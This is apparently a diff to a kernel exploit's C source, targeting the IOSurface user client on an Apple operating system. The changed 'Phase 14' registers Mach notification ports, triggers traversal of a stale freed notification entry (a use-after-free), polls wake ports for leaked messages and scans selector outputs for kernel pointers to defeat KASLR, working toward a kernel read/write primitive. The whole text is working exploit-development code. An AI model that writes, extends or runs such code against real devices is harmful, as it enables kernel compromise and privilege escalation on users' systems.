@@ -20219,17 +20219,20 @@ new_modes:
         rlog("--- Phase 13 complete ---\n");
 
         /*
-         * Phase 14: IOSurface selector probe + kernel R/W primitive
+         * Phase 14: UAF notification chain + kernel R/W
          *
-         * After MTE brute-force success, we have a matched spray surface that
-         * the stale notification entry points to. Probe all IOSurface user
-         * client selectors to:
-         * 1. Find KASLR leak (returned data containing kernel pointers)
-         * 2. Test indexed timestamp write (sel 33) and use_count read (sel 16)
-         * 3. Probe property get/set for kernel state leakage
-         * 4. Map the matched surface's pixel buffer for shared memory R/W
+         * After MTE brute-force, spray[match_idx] occupies the freed surface's
+         * kernel memory. The stale notification entry still points via +0x58.
+         * Strategy:
+         * 14-id: Identify matched surface (if unknown) via notifier probe
+         * 14a: Register notifications on matched surface to initialize callbacks
+         * 14b: Trigger notification traversal via IOSurfaceSetValue
+         * 14c: Check all saved wake ports for Mach messages
+         * 14d: Bulk property changes if no initial messages
+         * 14e: Probe surface info structs for KASLR leak
+         * 14f: Dump matched surface state
          */
-        rlog("\n--- Phase 14: IOSurface selector probe + kernel R/W ---\n");
+        rlog("\n--- Phase 14: UAF notification chain + kernel R/W ---\n");
         {
             io_service_t svc14 = IOServiceGetMatchingService(kIOMasterPortDefault,
                 IOServiceMatching("IOSurfaceRoot"));
@@ -20417,281 +20420,334 @@ new_modes:
                 }
             }
 
-            /* 14a: Probe key selectors on spray surfaces */
-            rlog("  14a: IOSurface selector probe\n");
-
-            /* Determine which surfaces to probe */
-            int p14_surf_count = 0;
-            IOSurfaceRef *p14_surfs = NULL;
-            IOSurfaceID *p14_ids = NULL;
+            /* 14a: Register new notifications on matched surface via sel[17]
+             * This creates entries in the surface's notification list AND may
+             * initialize the callback array at +0x108/+0x110 needed by inner().
+             * We register multiple times with different ports. */
+            rlog("  14a: Registering notifications on matched surface\n");
+            #define P14_NEW_PORTS 16
+            mach_port_t p14_ports[P14_NEW_PORTS];
+            int p14_port_n = 0;
 
             if (match_surf) {
-                p14_surf_count = 1;
-                p14_surfs = &match_surf;
-                rlog("    Single matched surface: idx=%d id=%u\n", r229_matched_idx, match_id);
-            } else if (rounds == 229 && r229_matched_idx < 0) {
-                /* Still unknown — probe all 256 */
-                p14_surf_count = 0;
-                for (int si = 0; si < 256; si++) {
-                    if (r229_spray_static[si]) p14_surf_count++;
-                }
-                rlog("    Still unknown — probing all %d spray surfaces\n", p14_surf_count);
-            }
+                uint64_t p14_inp[3] = {1, 2, 3};
+                for (int i = 0; i < P14_NEW_PORTS; i++) {
+                    mach_port_t np = MACH_PORT_NULL;
+                    kern_return_t kr = mach_port_allocate(mach_task_self(),
+                        MACH_PORT_RIGHT_RECEIVE, &np);
+                    if (kr != KERN_SUCCESS) continue;
+                    mach_port_insert_right(mach_task_self(), np, np,
+                        MACH_MSG_TYPE_MAKE_SEND);
 
-            /* Probe sel 0 (s_create_surface) on first surface for baseline */
-            if (p14_surf_count > 0) {
-                IOSurfaceRef first_surf = (r229_matched_idx >= 0) ? r229_matched_surf : r229_spray_static[0];
-                IOSurfaceID first_id = first_surf ? IOSurfaceGetID(first_surf) : 0;
-
-                /* Probe key selectors on first surface to see what returns data */
-                uint32_t key_sels[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
-                                       19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40};
-                for (int ki = 0; ki < (int)(sizeof(key_sels)/sizeof(key_sels[0])); ki++) {
-                    uint32_t sel = key_sels[ki];
-                    uint64_t si[6] = {0};
-                    uint32_t sic = 0;
-                    uint64_t so[6] = {0};
-                    uint32_t soc = 6;
-                    uint8_t struct_out[4096];
-                    memset(struct_out, 0, sizeof(struct_out));
-                    size_t struct_out_sz = sizeof(struct_out);
-
-                    if (sel == 33) {
-                        si[0] = first_id; si[1] = 0; si[2] = 0x4141414142424242ULL; sic = 3;
-                    } else if (sel == 34) {
-                        continue;
+                    uint64_t ref = 0x14A00000ULL | (uint64_t)i;
+                    kr = IOConnectCallAsyncMethod(uc14, 17, np, &ref, 1,
+                        NULL, 0, p14_inp, 24, NULL, NULL, NULL, NULL);
+                    if (i < 3 || kr != KERN_SUCCESS)
+                        rlog("    reg[%d] port=%u kr=0x%x\n", i, np, (uint32_t)kr);
+                    if (kr == KERN_SUCCESS) {
+                        p14_ports[p14_port_n++] = np;
                     } else {
-                        si[0] = first_id; sic = 1;
-                    }
-
-                    kern_return_t kr = IOConnectCallMethod(uc14, sel,
-                        si, sic, NULL, 0, so, &soc, struct_out, &struct_out_sz);
-
-                    if (kr == KERN_SUCCESS || soc > 0 || struct_out_sz > 0) {
-                        rlog("    sel[%2u] kr=0x%x soc=%u sos=%zu", sel, (uint32_t)kr, soc, struct_out_sz);
-                        for (uint32_t i = 0; i < soc && i < 6; i++) {
-                            rlog(" so[%u]=0x%llx", i, (unsigned long long)so[i]);
-                            if (so[i] > 0xfffffe0000000000ULL && so[i] < 0xffffffffffff0000ULL)
-                                rlog("**KPTR**");
-                        }
-                        rlog("\n");
-                        if (struct_out_sz > 0 && struct_out_sz <= 512) {
-                            uint64_t *p = (uint64_t *)struct_out;
-                            for (size_t i = 0; i < struct_out_sz / 8; i++) {
-                                if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
-                                    rlog("      struct[%zu]=0x%llx **KPTR**\n", i*8, (unsigned long long)p[i]);
-                            }
-                        }
-                    } else if (kr != (kern_return_t)0xE00002C2 && kr != (kern_return_t)0xE00002BC) {
-                        rlog("    sel[%2u] kr=0x%x\n", sel, (uint32_t)kr);
+                        mach_port_deallocate(mach_task_self(), np);
                     }
                 }
-            }
+                rlog("    Registered %d new notifications\n", p14_port_n);
 
-            /* 14a2: Use count delta probe — check each surface's use_count */
-            rlog("  14a2: Use count probe across %d surfaces\n", p14_surf_count);
-            if (rounds == 229 && r229_matched_idx < 0) {
-                for (int si = 0; si < 256; si++) {
-                    if (!r229_spray_static[si]) continue;
-                    IOSurfaceID sid = IOSurfaceGetID(r229_spray_static[si]);
-                    uint64_t si16[1] = { sid };
-                    uint64_t so16[1] = {0};
-                    uint32_t soc16 = 1;
-                    kern_return_t kr16 = IOConnectCallMethod(uc14, 16,
-                        si16, 1, NULL, 0, so16, &soc16, NULL, NULL);
-                    int use_count = IOSurfaceGetUseCount(r229_spray_static[si]);
-                    if (si < 5 || si == 127 || si == 128 || si == 255 || so16[0] != 0) {
-                        rlog("    spray[%d] id=%u uc_kern=%llu uc_user=%d\n",
-                            si, sid, (unsigned long long)so16[0], use_count);
-                    }
+                /* Also register via sel[10] (async register, stIn=0x18) */
+                mach_port_t p14_sel10_port = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p14_sel10_port);
+                mach_port_insert_right(mach_task_self(), p14_sel10_port, p14_sel10_port,
+                    MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref10 = 0xAA10AA10ULL;
+                uint8_t s10_buf[24];
+                memset(s10_buf, 0, sizeof(s10_buf));
+                uint32_t sid32 = match_id;
+                memcpy(s10_buf, &sid32, 4);
+                kern_return_t kr10 = IOConnectCallAsyncMethod(uc14, 10, p14_sel10_port,
+                    &ref10, 1, NULL, 0, s10_buf, 24, NULL, NULL, NULL, NULL);
+                rlog("    sel[10] async register kr=0x%x port=%u\n",
+                    (uint32_t)kr10, p14_sel10_port);
+
+                /* Also try sel[11] (sync register, stIn=0x18) */
+                uint8_t s11_buf[24];
+                memset(s11_buf, 0, sizeof(s11_buf));
+                memcpy(s11_buf, &sid32, 4);
+                kern_return_t kr11 = IOConnectCallMethod(uc14, 11,
+                    NULL, 0, s11_buf, 24, NULL, NULL, NULL, NULL);
+                rlog("    sel[11] sync register kr=0x%x\n", (uint32_t)kr11);
+
+                /* 14b: Trigger notification traversal via property set/remove.
+                 * IOSurfaceSetValue triggers the kernel to walk the notification
+                 * list. The stale entry will be found, and dispatch will:
+                 * 1. Read entry+0x58 -> matched surface kernel addr
+                 * 2. Read surface+0xD8 -> lock
+                 * 3. Call inner() -> checks +0x108/+0x110 callbacks
+                 * 4. If inner returns 1 -> sends Mach msg to entry+0x10 (wake port)
+                 */
+                rlog("  14b: Triggering notification traversal (3 rounds)\n");
+                for (int trig = 0; trig < 3; trig++) {
+                    int marker = 0xCAFE0000 | trig;
+                    CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                    IOSurfaceSetValue(match_surf, CFSTR("_p14trig"), mv);
+                    CFRelease(mv);
+                    IOSurfaceRemoveValue(match_surf, CFSTR("_p14trig"));
+                    usleep(1000);
                 }
-            }
+                rlog("    Traversal triggered (no crash = MTE match confirmed)\n");
 
-            /* 14a3: Shared memory scan for kernel pointers */
-            rlog("  14a3: Shared memory scan\n");
-            {
-                int kptr_found = 0;
-                int surf_start = (r229_matched_idx >= 0) ? r229_matched_idx : 0;
-                int surf_end = (r229_matched_idx >= 0) ? r229_matched_idx + 1 : 256;
-                for (int si = surf_start; si < surf_end; si++) {
-                    IOSurfaceRef s = (r229_matched_idx >= 0) ? r229_matched_surf : r229_spray_static[si];
-                    if (!s) continue;
-                    IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
-                    void *base = IOSurfaceGetBaseAddress(s);
-                    size_t sz = IOSurfaceGetAllocSize(s);
-                    if (base && sz >= 8) {
-                        uint64_t *p = (uint64_t *)base;
-                        for (size_t off = 0; off < sz / 8 && off < 512; off++) {
-                            if (p[off] > 0xfffffe0000000000ULL && p[off] < 0xffffffffffff0000ULL) {
-                                rlog("    spray[%d]+0x%zx = 0x%llx **KPTR**\n",
-                                    si, off*8, (unsigned long long)p[off]);
-                                kptr_found++;
-                            }
+                /* 14c: Check ALL wake ports for Mach messages */
+                rlog("  14c: Checking wake ports for Mach messages\n");
+                int total_msgs = 0;
+
+                /* Check original stale entry wake ports from Phase 13 */
+                rlog("    Checking %d saved Phase 13 ports...\n", r229_saved_wp_n);
+                for (int wi = 0; wi < r229_saved_wp_n; wi++) {
+                    if (!r229_saved_wps[wi]) continue;
+                    uint8_t msg_buf[512];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = r229_saved_wps[wi];
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), r229_saved_wps[wi], 10, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) {
+                        total_msgs++;
+                        rlog("    *** MSG on saved_wp[%d] port=%u ***\n", wi, r229_saved_wps[wi]);
+                        rlog("      msgh_id=0x%x size=%u bits=0x%x\n",
+                            hdr->msgh_id, hdr->msgh_size, hdr->msgh_bits);
+                        uint64_t *payload = (uint64_t *)(msg_buf + sizeof(mach_msg_header_t));
+                        int payload_words = (hdr->msgh_size > sizeof(mach_msg_header_t)) ?
+                            (int)((hdr->msgh_size - sizeof(mach_msg_header_t)) / 8) : 0;
+                        for (int pi = 0; pi < payload_words && pi < 16; pi++) {
+                            rlog("      +0x%02x: 0x%016llx", pi * 8,
+                                (unsigned long long)payload[pi]);
+                            if (payload[pi] > 0xfffffe0000000000ULL &&
+                                payload[pi] < 0xffffffffffff0000ULL)
+                                rlog(" **KPTR**");
+                            rlog("\n");
                         }
+                    } else if (wi < 5 || wi == r229_saved_wp_n - 1) {
+                        rlog("    saved_wp[%d] mr=0x%x\n", wi, (uint32_t)mr);
                     }
-                    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
-                    if (kptr_found >= 10) break;
                 }
-                rlog("    shared mem kernel ptrs found: %d\n", kptr_found);
-            }
 
-            /* 14b: Test IOSurface property read for kernel pointer leaks */
-            rlog("  14b: IOSurface property probe\n");
-            if (match_surf) {
-                /* Set a marker property */
-                int marker = 0xDEADBEEF;
-                CFNumberRef marker_val = CFNumberCreate(NULL, kCFNumberIntType, &marker);
-                IOSurfaceSetValue(match_surf, CFSTR("TestMarker"), marker_val);
-                CFRelease(marker_val);
-
-                /* Read all properties */
-                CFDictionaryRef all_props = IOSurfaceCopyAllValues(match_surf);
-                if (all_props) {
-                    CFIndex count = CFDictionaryGetCount(all_props);
-                    rlog("    Surface has %ld properties\n", (long)count);
-
-                    const void **keys = (const void **)malloc(count * sizeof(void *));
-                    const void **vals = (const void **)malloc(count * sizeof(void *));
-                    CFDictionaryGetKeysAndValues(all_props, keys, vals);
-
-                    for (CFIndex i = 0; i < count; i++) {
-                        char key_buf[256] = {0};
-                        if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
-                            CFStringGetCString(keys[i], key_buf, sizeof(key_buf), kCFStringEncodingUTF8);
-
-                        if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
-                            int64_t v = 0;
-                            CFNumberGetValue(vals[i], kCFNumberSInt64Type, &v);
-                            uint64_t uv = (uint64_t)v;
-                            if (uv > 0xfffffe0000000000ULL && uv < 0xffffffffffff0000ULL)
-                                rlog("    ** KASLR? ** prop '%s' = 0x%llx\n",
-                                    key_buf, (unsigned long long)uv);
-                            else if (uv > 0x100000 && key_buf[0])
-                                rlog("    prop '%s' = 0x%llx\n", key_buf, (unsigned long long)uv);
-                        } else if (CFGetTypeID(vals[i]) == CFDataGetTypeID()) {
-                            CFDataRef dv = (CFDataRef)vals[i];
-                            CFIndex len = CFDataGetLength(dv);
-                            const uint8_t *bytes = CFDataGetBytePtr(dv);
-                            rlog("    prop '%s' = data[%ld]", key_buf, (long)len);
-                            if (len >= 8) {
-                                uint64_t *p = (uint64_t *)bytes;
-                                for (CFIndex j = 0; j < len / 8 && j < 8; j++) {
-                                    if (p[j] > 0xfffffe0000000000ULL && p[j] < 0xffffffffffff0000ULL)
-                                        rlog(" ** KASLR@%ld:0x%llx **", (long)(j*8), (unsigned long long)p[j]);
-                                }
-                            }
+                /* Check newly registered sel[17] ports */
+                rlog("    Checking %d new sel[17] ports...\n", p14_port_n);
+                for (int pi = 0; pi < p14_port_n; pi++) {
+                    uint8_t msg_buf[512];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = p14_ports[pi];
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), p14_ports[pi], 10, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) {
+                        total_msgs++;
+                        rlog("    *** MSG on new_port[%d] port=%u ***\n", pi, p14_ports[pi]);
+                        rlog("      msgh_id=0x%x size=%u bits=0x%x\n",
+                            hdr->msgh_id, hdr->msgh_size, hdr->msgh_bits);
+                        uint64_t *payload = (uint64_t *)(msg_buf + sizeof(mach_msg_header_t));
+                        int pw = (hdr->msgh_size > sizeof(mach_msg_header_t)) ?
+                            (int)((hdr->msgh_size - sizeof(mach_msg_header_t)) / 8) : 0;
+                        for (int j = 0; j < pw && j < 16; j++) {
+                            rlog("      +0x%02x: 0x%016llx", j * 8,
+                                (unsigned long long)payload[j]);
+                            if (payload[j] > 0xfffffe0000000000ULL &&
+                                payload[j] < 0xffffffffffff0000ULL)
+                                rlog(" **KPTR**");
                             rlog("\n");
                         }
                     }
-                    free(keys);
-                    free(vals);
-                    CFRelease(all_props);
                 }
 
-                /* Remove marker */
-                IOSurfaceRemoveValue(match_surf, CFSTR("TestMarker"));
-            }
-
-            /* 14c: Test selector 33 (s_set_indexed_timestamp) with index 0 */
-            rlog("  14c: Testing s_set_indexed_timestamp (sel 33)\n");
-            if (match_id) {
-                for (int idx = 0; idx < 4; idx++) {
-                    uint64_t ts_in[3] = { match_id, (uint64_t)idx, 0x4141414100000000ULL | idx };
-                    uint64_t ts_out[2] = {0};
-                    uint32_t ts_oc = 2;
-                    kern_return_t kr = IOConnectCallMethod(uc14, 33,
-                        ts_in, 3, NULL, 0, ts_out, &ts_oc, NULL, NULL);
-                    rlog("    set_timestamp[%d] kr=0x%x oc=%u out0=0x%llx out1=0x%llx\n",
-                        idx, (uint32_t)kr, ts_oc,
-                        (unsigned long long)ts_out[0], (unsigned long long)ts_out[1]);
-                }
-
-                /* Read timestamps back via selector for get_indexed_timestamp */
-                for (uint32_t gsel = 32; gsel <= 35; gsel++) {
-                    if (gsel == 33) continue;
-                    uint64_t gi[2] = { match_id, 0 };
-                    uint64_t go[4] = {0};
-                    uint32_t goc = 4;
-                    kern_return_t kr = IOConnectCallMethod(uc14, gsel,
-                        gi, 2, NULL, 0, go, &goc, NULL, NULL);
-                    if (kr == KERN_SUCCESS || goc > 0) {
-                        rlog("    sel[%u](get) kr=0x%x oc=%u", gsel, (uint32_t)kr, goc);
-                        for (uint32_t i = 0; i < goc; i++)
-                            rlog(" o%u=0x%llx", i, (unsigned long long)go[i]);
-                        rlog("\n");
+                /* Check sel[10] port */
+                {
+                    uint8_t msg_buf[512];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = p14_sel10_port;
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), p14_sel10_port, 10, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) {
+                        total_msgs++;
+                        rlog("    *** MSG on sel10_port=%u ***\n", p14_sel10_port);
+                        rlog("      msgh_id=0x%x size=%u\n", hdr->msgh_id, hdr->msgh_size);
                     }
+                    rlog("    sel10_port mr=0x%x\n", (uint32_t)mr);
                 }
-            }
 
-            /* 14d: Test selector 16 (get_surface_use_count) */
-            rlog("  14d: Testing get_surface_use_count (sel 16)\n");
-            if (match_id) {
-                uint64_t uc_in[1] = { match_id };
-                uint64_t uc_out[2] = {0};
-                uint32_t uc_oc = 2;
-                kern_return_t kr = IOConnectCallMethod(uc14, 16,
-                    uc_in, 1, NULL, 0, uc_out, &uc_oc, NULL, NULL);
-                rlog("    use_count kr=0x%x oc=%u out0=0x%llx out1=0x%llx\n",
-                    (uint32_t)kr, uc_oc,
-                    (unsigned long long)uc_out[0], (unsigned long long)uc_out[1]);
-            }
+                rlog("    Total messages after initial trigger: %d\n", total_msgs);
 
-            /* 14e: Scan matched surface shared memory for kernel pointers */
-            rlog("  14e: Scanning shared memory mapping for kernel data\n");
-            if (match_surf) {
-                IOSurfaceLock(match_surf, kIOSurfaceLockReadOnly, NULL);
-                void *base = IOSurfaceGetBaseAddress(match_surf);
-                size_t sz = IOSurfaceGetAllocSize(match_surf);
-                if (base && sz > 0) {
-                    uint64_t *p = (uint64_t *)base;
-                    int kern_ptrs = 0;
-                    for (size_t i = 0; i < sz / 8 && i < 1024; i++) {
-                        if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL) {
-                            rlog("    shm[0x%zx] = 0x%llx ** KERNEL PTR **\n",
-                                i * 8, (unsigned long long)p[i]);
-                            kern_ptrs++;
+                /* 14d: If no messages, try bulk property changes to generate more
+                 * traversal events */
+                if (total_msgs == 0) {
+                    rlog("  14d: No messages — trying bulk property changes\n");
+                    for (int i = 0; i < 50; i++) {
+                        char key[32];
+                        snprintf(key, sizeof(key), "_p14bulk_%d", i);
+                        CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+                        int val = 0xBEEF0000 | i;
+                        CFNumberRef vn = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                        IOSurfaceSetValue(match_surf, ks, vn);
+                        CFRelease(vn);
+                        CFRelease(ks);
+                    }
+                    usleep(10000);
+                    for (int i = 0; i < 50; i++) {
+                        char key[32];
+                        snprintf(key, sizeof(key), "_p14bulk_%d", i);
+                        CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+                        IOSurfaceRemoveValue(match_surf, ks);
+                        CFRelease(ks);
+                    }
+                    usleep(10000);
+
+                    /* Re-check all ports */
+                    int bulk_msgs = 0;
+                    for (int wi = 0; wi < r229_saved_wp_n; wi++) {
+                        if (!r229_saved_wps[wi]) continue;
+                        uint8_t msg_buf[512];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                        memset(msg_buf, 0, sizeof(msg_buf));
+                        hdr->msgh_size = sizeof(msg_buf);
+                        hdr->msgh_local_port = r229_saved_wps[wi];
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msg_buf), r229_saved_wps[wi], 5, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) {
+                            bulk_msgs++;
+                            rlog("    *** BULK MSG on saved_wp[%d] ***\n", wi);
+                            rlog("      msgh_id=0x%x size=%u\n", hdr->msgh_id, hdr->msgh_size);
+                            uint64_t *payload = (uint64_t *)(msg_buf + sizeof(mach_msg_header_t));
+                            int pw = (hdr->msgh_size > sizeof(mach_msg_header_t)) ?
+                                (int)((hdr->msgh_size - sizeof(mach_msg_header_t)) / 8) : 0;
+                            for (int j = 0; j < pw && j < 16; j++)
+                                rlog("      +0x%02x: 0x%016llx\n", j * 8,
+                                    (unsigned long long)payload[j]);
                         }
                     }
-                    if (!kern_ptrs)
-                        rlog("    No kernel pointers in shared memory (expected for pixel buffer)\n");
+                    for (int pi = 0; pi < p14_port_n; pi++) {
+                        uint8_t msg_buf[512];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                        memset(msg_buf, 0, sizeof(msg_buf));
+                        hdr->msgh_size = sizeof(msg_buf);
+                        hdr->msgh_local_port = p14_ports[pi];
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msg_buf), p14_ports[pi], 5, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) {
+                            bulk_msgs++;
+                            rlog("    *** BULK MSG on new_port[%d] ***\n", pi);
+                            rlog("      msgh_id=0x%x size=%u\n", hdr->msgh_id, hdr->msgh_size);
+                        }
+                    }
+                    total_msgs += bulk_msgs;
+                    rlog("    Bulk trigger messages: %d (total: %d)\n", bulk_msgs, total_msgs);
                 }
-                IOSurfaceUnlock(match_surf, kIOSurfaceLockReadOnly, NULL);
-            }
 
-            /* 14f: Probe IOSurface client connection for KASLR via struct output */
-            rlog("  14f: Struct output probe for KASLR\n");
-            {
-                int f_start = (r229_matched_idx >= 0) ? r229_matched_idx : 0;
-                int f_end = (r229_matched_idx >= 0) ? r229_matched_idx + 1 : 256;
-                int f_step = (r229_matched_idx >= 0) ? 1 : 16; /* sample every 16th when probing all */
-                for (int fi = f_start; fi < f_end; fi += f_step) {
-                    IOSurfaceRef fs = (r229_matched_idx >= 0) ? r229_matched_surf : r229_spray_static[fi];
-                    if (!fs) continue;
-                    IOSurfaceID fid = IOSurfaceGetID(fs);
-                    for (uint32_t sel = 0; sel <= 15; sel++) {
-                        uint64_t si[4] = { fid, 0, 0, 0 };
-                        uint8_t sout[4096];
-                        memset(sout, 0, sizeof(sout));
-                        size_t sout_sz = sizeof(sout);
-                        uint64_t so[6] = {0};
-                        uint32_t soc = 0;
-                        kern_return_t kr = IOConnectCallMethod(uc14, sel,
-                            si, 1, NULL, 0, so, &soc, sout, &sout_sz);
-                        if (kr == KERN_SUCCESS && sout_sz > 0) {
-                            rlog("    spray[%d] sel[%2u] struct_out=%zu bytes\n", fi, sel, sout_sz);
-                            uint64_t *p = (uint64_t *)sout;
-                            for (size_t i = 0; i < sout_sz / 8 && i < 32; i++) {
-                                if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
-                                    rlog("      +0x%zx = 0x%llx ** KASLR LEAK **\n",
-                                        i*8, (unsigned long long)p[i]);
-                                else if (p[i] > 0xffff000000000000ULL)
-                                    rlog("      +0x%zx = 0x%llx (high)\n",
-                                        i*8, (unsigned long long)p[i]);
+                /* 14e: Probe surface info structs for KASLR leak */
+                rlog("  14e: Surface info struct probes for KASLR\n");
+                {
+                    /* sel[6]: get info -> 40 bytes struct out */
+                    uint8_t info6[64];
+                    memset(info6, 0, sizeof(info6));
+                    size_t info6_sz = sizeof(info6);
+                    kern_return_t kr6 = IOConnectCallMethod(uc14, 6,
+                        NULL, 0, NULL, 0, NULL, NULL, info6, &info6_sz);
+                    rlog("    sel[6] kr=0x%x sz=%zu\n", (uint32_t)kr6, info6_sz);
+                    if (kr6 == KERN_SUCCESS && info6_sz > 0) {
+                        uint64_t *p = (uint64_t *)info6;
+                        for (size_t i = 0; i < info6_sz / 8; i++) {
+                            rlog("      +0x%02zx: 0x%016llx", i * 8, (unsigned long long)p[i]);
+                            if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
+                                rlog(" **KPTR**");
+                            rlog("\n");
+                        }
+                    }
+
+                    /* sel[27]: get surface info -> 3176 bytes struct out */
+                    uint64_t si27[1] = { match_id };
+                    uint8_t *info27 = (uint8_t *)malloc(4096);
+                    memset(info27, 0, 4096);
+                    size_t info27_sz = 4096;
+                    kern_return_t kr27 = IOConnectCallMethod(uc14, 27,
+                        si27, 1, NULL, 0, NULL, NULL, info27, &info27_sz);
+                    rlog("    sel[27] kr=0x%x sz=%zu\n", (uint32_t)kr27, info27_sz);
+                    if (kr27 == KERN_SUCCESS && info27_sz > 0) {
+                        uint64_t *p = (uint64_t *)info27;
+                        int kptr_n = 0;
+                        for (size_t i = 0; i < info27_sz / 8 && i < 400; i++) {
+                            if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL) {
+                                rlog("      +0x%03zx: 0x%016llx **KPTR**\n",
+                                    i * 8, (unsigned long long)p[i]);
+                                kptr_n++;
                             }
                         }
+                        if (!kptr_n) rlog("      No kernel pointers in %zu bytes\n", info27_sz);
                     }
+                    free(info27);
+
+                    /* sel[29]: GET 2 OUTPUTS */
+                    uint64_t si29[1] = { match_id };
+                    uint64_t so29[2] = {0};
+                    uint32_t soc29 = 2;
+                    kern_return_t kr29 = IOConnectCallMethod(uc14, 29,
+                        si29, 1, NULL, 0, so29, &soc29, NULL, NULL);
+                    rlog("    sel[29] kr=0x%x oc=%u o0=0x%llx o1=0x%llx\n",
+                        (uint32_t)kr29, soc29,
+                        (unsigned long long)so29[0], (unsigned long long)so29[1]);
+                    if (so29[0] > 0xfffffe0000000000ULL) rlog("      o0 **KPTR**\n");
+                    if (so29[1] > 0xfffffe0000000000ULL) rlog("      o1 **KPTR**\n");
+
+                    /* sel[31]: GET 4 SCALAR OUTPUTS */
+                    uint64_t si31[1] = { match_id };
+                    uint64_t so31[4] = {0};
+                    uint32_t soc31 = 4;
+                    kern_return_t kr31 = IOConnectCallMethod(uc14, 31,
+                        si31, 1, NULL, 0, so31, &soc31, NULL, NULL);
+                    rlog("    sel[31] kr=0x%x oc=%u", (uint32_t)kr31, soc31);
+                    for (uint32_t i = 0; i < soc31; i++) {
+                        rlog(" o%u=0x%llx", i, (unsigned long long)so31[i]);
+                        if (so31[i] > 0xfffffe0000000000ULL) rlog("**KPTR**");
+                    }
+                    rlog("\n");
+
+                    /* sel[25]: get scalar (no input scalars) */
+                    uint64_t so25[2] = {0};
+                    uint32_t soc25 = 2;
+                    kern_return_t kr25 = IOConnectCallMethod(uc14, 25,
+                        NULL, 0, NULL, 0, so25, &soc25, NULL, NULL);
+                    rlog("    sel[25] kr=0x%x oc=%u o0=0x%llx\n",
+                        (uint32_t)kr25, soc25, (unsigned long long)so25[0]);
                 }
+
+                /* 14f: Dump matched surface state */
+                rlog("  14f: Matched surface state dump\n");
+                rlog("    id=%u use_count=%d w=%zu h=%zu alloc=%zu pf=0x%x in_use=%d\n",
+                    IOSurfaceGetID(match_surf), IOSurfaceGetUseCount(match_surf),
+                    IOSurfaceGetWidth(match_surf), IOSurfaceGetHeight(match_surf),
+                    IOSurfaceGetAllocSize(match_surf), IOSurfaceGetPixelFormat(match_surf),
+                    IOSurfaceIsInUse(match_surf));
+                IOSurfaceLock(match_surf, kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(match_surf);
+                rlog("    BaseAddress=%p\n", base);
+                if (base) {
+                    uint64_t *p = (uint64_t *)base;
+                    for (int i = 0; i < 8; i++)
+                        rlog("      +0x%02x: 0x%016llx\n", i * 8, (unsigned long long)p[i]);
+                }
+                IOSurfaceUnlock(match_surf, kIOSurfaceLockReadOnly, NULL);
+
+                /* Cleanup Phase 14 ports */
+                for (int pi = 0; pi < p14_port_n; pi++) {
+                    if (p14_ports[pi]) mach_port_deallocate(mach_task_self(), p14_ports[pi]);
+                }
+                if (p14_sel10_port) mach_port_deallocate(mach_task_self(), p14_sel10_port);
             }
+
+            /* Cleanup saved wake ports */
+            for (int wi = 0; wi < r229_saved_wp_n; wi++) {
+                if (r229_saved_wps[wi]) mach_port_deallocate(mach_task_self(), r229_saved_wps[wi]);
+            }
+            r229_saved_wp_n = 0;
 
             IOServiceClose(uc14);
             IOObjectRelease(svc14);
